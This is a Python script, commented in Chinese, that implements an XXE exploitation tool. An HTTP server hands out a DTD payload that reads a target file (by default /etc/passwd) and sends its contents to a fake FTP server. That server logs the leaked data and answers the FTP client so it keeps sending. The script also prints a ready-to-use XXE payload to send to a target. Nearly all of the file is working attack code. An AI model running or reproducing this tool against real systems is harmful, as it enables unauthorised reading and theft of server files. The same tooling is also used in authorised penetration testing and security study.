import socket
import threading
import sys
import time
import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging

# === 配置部分 ===
BANNER = b'220 (vsFTPd 3.0.3)\r\n'
TIMEOUT = 10  # 连接超时时间

def get_host_ip():
    """ 获取本机局域网/公网 IP，用于构造 PASV 响应 """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


class DTDHandler(BaseHTTPRequestHandler):
    """HTTP handler for serving dynamic data.dtd"""
    
    public_ip = None
    ftp_port = None
    file_path = None
    
    def do_GET(self):
        """处理 GET 请求，返回动态生成的 DTD payload"""
        self.send_response(200)
        self.send_header('Content-type', 'application/xml-dtd')
        self.end_headers()
        
        # 构造 DTD payload
        # 确保文件路径格式正确 (file:/// + path)
        # 只移除开头的单个 /，保留 UNC 路径 (//server/share)
        file_path = self.file_path[1:] if self.file_path.startswith('/') else self.file_path
        dtd_content = f'''<!ENTITY % file SYSTEM "file:///{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{self.public_ip}:{self.ftp_port}/%file;'>">
%eval;
%exfil;
'''
        
        self.wfile.write(dtd_content.encode())
        
        # 记录请求
        logging.info(f"[HTTP] Request from {self.address_string()} - Path: {self.path}")
        logging.info(f"[HTTP] Sent DTD payload for file: {self.file_path}")
    
    def log_message(self, format, *args):
        """自定义日志格式"""
        logging.info(f"[HTTP] {self.address_string()} - {format % args}")


def start_http_server(port, public_ip, ftp_port, file_path):
    """启动 HTTP 服务器用于提供 data.dtd
    
    Note: Class attributes are set once before serve_forever() and remain 
    read-only during serving, so thread safety is not a concern here.
    """
    DTDHandler.public_ip = public_ip
    DTDHandler.ftp_port = ftp_port
    DTDHandler.file_path = file_path
    
    server = HTTPServer(('0.0.0.0', port), DTDHandler)
    logging.info(f"[*] HTTP Server started on port {port}")
    logging.info(f"[*] DTD Payload URL: http://{public_ip}:{port}/data.dtd")
    server.serve_forever()

def pasv_connection_handler(pasv_socket):
    """
    后台线程：处理 PASV 数据连接。
    主要目的是完成 TCP 握手，防止客户端报错，
    实际上 XXE 攻击的数据通常夹带在控制信道的命令中，而非数据信道。
    """
    try:
        pasv_socket.settimeout(5.0)
        conn_data, addr = pasv_socket.accept()
        # print(f"[*] [DEBUG] Data connection received from {addr}")
        conn_data.close()
    except Exception:
        pass
    finally:
        pasv_socket.close()

def handle_client(conn, addr, output_file=None):
    """ 处理主控制信道连接 """
    print(f"[*] New Connection from {addr[0]}:{addr[1]}")
    captured_data = []
    
    try:
        conn.send(BANNER)
        conn.settimeout(TIMEOUT)

        while True:
            try:
                raw_data = conn.recv(4096)
                if not raw_data: break
                msg_block = raw_data.decode('utf-8', errors='ignore')
            except socket.timeout:
                print(f"[!] Timeout from {addr} (Transfer likely finished)")
                break
            except Exception as e:
                print(f"[-] Socket error: {e}")
                break

            # 处理可能粘包的多行数据
            lines = msg_block.split('\n')
            for line in lines:
                line = line.strip()
                if not line: continue
                
                cmd_upper = line.upper()

                # === 1. 标准 FTP 协议握手 ===
                if cmd_upper.startswith('USER'):
                    conn.send(b'331 Please specify the password.\r\n')
                elif cmd_upper.startswith('PASS'):
                    conn.send(b'230 Login successful.\r\n')
                elif cmd_upper.startswith('SYST'):
                    conn.send(b'215 UNIX Type: L8\r\n')
                elif cmd_upper.startswith('FEAT'):
                    conn.send(b'211-Features:\r\n PASV\r\n211 End\r\n')
                elif cmd_upper.startswith('PWD'):
                    conn.send(b'257 "/home/user" is the current directory.\r\n')
                elif cmd_upper.startswith('TYPE'):
                    conn.send(b'200 Switching to Binary mode.\r\n')
                elif cmd_upper.startswith('OPTS'):
                    conn.send(b'200 OPTS command successful.\r\n')
                
                # === 2. 关键：拒绝 EPSV，强制使用 PASV ===
                elif cmd_upper.startswith('EPSV'):
                     conn.send(b'502 Command not implemented.\r\n') 

                # === 3. PASV 模式处理 (线程安全版) ===
                elif cmd_upper.startswith('PASV'):
                    try:
                        # 绑定随机端口
                        s_pasv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s_pasv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s_pasv.bind((IP, 0))
                        s_pasv.listen(1)
                        
                        _, port = s_pasv.getsockname()
                        
                        # 启动后台线程等待数据连接，不阻塞主循环
                        t = threading.Thread(target=pasv_connection_handler, args=(s_pasv,))
                        t.daemon = True
                        t.start()
                        
                        # 计算并发送 227 响应
                        ip_parts = IP.split('.')
                        p1, p2 = port // 256, port % 256
                        msg = f'227 Entering Passive Mode ({",".join(ip_parts)},{p1},{p2}).\r\n'
                        conn.send(msg.encode())
                    except Exception as e:
                        print(f"[-] PASV Setup Error: {e}")
                        conn.send(b'425 Can\'t open data connection.\r\n')

                # === 4. XXE 数据捕获区 ===
                elif cmd_upper.startswith('CWD'):
                    data = line[4:].strip()
                    captured_data.append(data)
                    print(f"[+] CWD Data: {data}")
                    conn.send(b'250 Directory successfully changed.\r\n')

                elif cmd_upper.startswith('RETR'):
                    data = line[5:].strip()
                    captured_data.append(data)
                    print(f"[+] RETR Data: {data}")
                    # 假装开启传输，配合 PASV 完成流程
                    conn.send(b'150 Opening BINARY mode data connection.\r\n')
                    conn.send(b'226 Transfer complete.\r\n')

                elif cmd_upper.startswith('QUIT'):
                    conn.send(b'221 Goodbye.\r\n')
                    return

                # === 5. Catch-All (处理多行文件内容) ===
                else:
                    # 任何不认识的命令都视为文件内容的一行
                    # Java FTP 客户端会将文件中的换行符视为命令结束，发送下一行作为新命令
                    # 我们必须返回 200 欺骗客户端继续发送
                    captured_data.append(line)
                    conn.send(b'200 Command okay.\r\n')

    except Exception as e:
        print(f"[-] Connection Error: {e}")
    finally:
        conn.close()
        print(f"[*] Connection closed: {addr}")
        
        # === 写入日志 ===
        if output_file and captured_data:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            header = f"\n{'='*20} Captured from {addr[0]} at {timestamp} {'='*20}\n"
            content = "\n".join(captured_data)
            footer = f"\n{'='*60}\n"
            
            try:
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(header + content + footer)
                print(f"[*] Data saved to {output_file}")
                # 预览前5行
                print("--- Preview ---")
                print("\n".join(captured_data[:5]))
                if len(captured_data) > 5: print("...")
            except Exception as e:
                print(f"[-] Write file error: {e}")

if __name__ == '__main__':
    # 解析命令行参数
    parser = argparse.ArgumentParser(
        description='XXE Fake FTP Server - 结合 HTTP 和 FTP 服务器用于 XXE 漏洞利用',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
示例:
  %(prog)s 2121                           # 仅启动 FTP 服务器，端口 2121
  %(prog)s 2121 --http-port 8000          # 启动 FTP(2121) 和 HTTP(8000) 服务器
  %(prog)s 2121 -w 8000 -f /etc/passwd    # 指定默认读取文件
  %(prog)s 2121 -w 8000 -o data.log       # 保存捕获数据到文件
  %(prog)s 2121 -w 8000 --ip 192.168.1.1  # 指定公网 IP
        ''')
    
    parser.add_argument('port', 
                        type=int,
                        help='FTP 服务器监听端口')
    parser.add_argument('-o', '--output',
                        dest='output_file',
                        help='捕获数据输出文件')
    parser.add_argument('-w', '--http-port',
                        type=int,
                        dest='http_port',
                        help='HTTP 服务器端口 (用于提供 data.dtd)')
    parser.add_argument('--ip',
                        dest='public_ip',
                        help='公网 IP 地址 (默认自动检测)')
    parser.add_argument('-f', '--file',
                        dest='file_path',
                        default='/etc/passwd',
                        help='要读取的目标文件路径 (默认: /etc/passwd)')
    
    args = parser.parse_args()
    
    # PUBLIC_IP 用于 payload 和响应生成 (显示给外部使用)
    PUBLIC_IP = args.public_ip if args.public_ip else get_host_ip()
    # IP 用于 PASV 模式绑定本地网络接口
    IP = get_host_ip()
    PORT = args.port
    ADDR_MAIN = ('0.0.0.0', PORT)  # 绑定到所有接口

    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(ADDR_MAIN)
        server.listen(10)
        print(f"[*] XXE Fake FTP Server listening on 0.0.0.0:{PORT} (Public IP: {PUBLIC_IP})")
        if args.output_file:
            print(f"[*] Logging captured data to: {args.output_file}")
        
        # 启动 HTTP 服务器 (如果指定了端口)
        if args.http_port:
            http_thread = threading.Thread(
                target=start_http_server,
                args=(args.http_port, PUBLIC_IP, PORT, args.file_path),
                daemon=True
            )
            http_thread.start()
            
            # 打印 XXE payload 使用说明
            xxe_payload = f'''
[*] XXE Payload Usage:
===============================================================
请发送如下 XXE payload 到目标服务器:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{PUBLIC_IP}:{args.http_port}/data.dtd">
  %xxe;
]>

DTD URL: http://{PUBLIC_IP}:{args.http_port}/data.dtd
目标文件: {args.file_path}
FTP 回连地址: ftp://{PUBLIC_IP}:{PORT}
===============================================================
'''
            print(xxe_payload)

        while True:
            conn, addr = server.accept()
            client_thread = threading.Thread(
                target=handle_client,
                args=(conn, addr, args.output_file)
            )
            client_thread.daemon = True
            client_thread.start()
            
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
    except Exception as e:
        print(f"\n[!] Critical Error: {e}")
    finally:
        server.close()
